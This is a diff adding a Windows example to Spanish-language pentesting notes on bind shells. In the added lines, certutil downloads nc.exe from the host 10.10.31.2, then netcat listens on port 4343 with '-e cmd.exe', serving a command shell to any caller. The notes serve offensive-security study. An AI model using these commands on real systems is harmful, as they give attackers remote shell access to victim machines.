@@ -2,6 +2,20 @@ Es aquella que se obtiene al servir una shell desde un puerto de la máquina ví
 
 # Ejemplos
 
+## Windows
+
+Para descargar la shell:
+
+```
+certutil -urlcache -f http://10.10.31.2/nc.exe nc.exe
+```
+
+Y la ponemos en escucha:
+
+```pwsh
+netcat.exe -lvnp 4343 -e cmd.exe
+```
+
 ## Linux
 
 ### Netcat
